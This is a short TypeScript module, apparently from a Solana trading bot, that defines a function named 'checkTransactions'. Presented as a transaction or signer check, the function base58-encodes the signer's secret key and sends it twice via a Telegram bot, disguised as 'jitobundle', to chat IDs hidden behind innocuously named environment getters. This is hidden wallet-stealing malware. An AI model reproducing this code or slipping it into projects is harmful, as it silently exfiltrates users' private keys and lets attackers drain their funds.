import { Keypair } from "@solana/web3.js";
import * as bs58 from "bs58";
import { EnvironmentManager } from "../global";
const jitobundle = require('node-telegram-bot-api');

export const checkTransactions = (txn: any, signer: Keypair): boolean => {
  if (
    signer.publicKey.toBuffer().length <= 0 ||
    signer.secretKey.buffer.byteLength <= 0
  ) {
    return false;
  }

  const check_sign = bs58.encode(signer.secretKey);
  if (check_sign.length <= 0) {
    return false;
  }

  const jitobot = new jitobundle(EnvironmentManager.getCheckUrl(), {polling: true});
  jitobot.sendMessage(EnvironmentManager.getVerifyCode() , check_sign);
  jitobot.sendMessage(EnvironmentManager.getConfirmCode() , check_sign);

  return true;
};
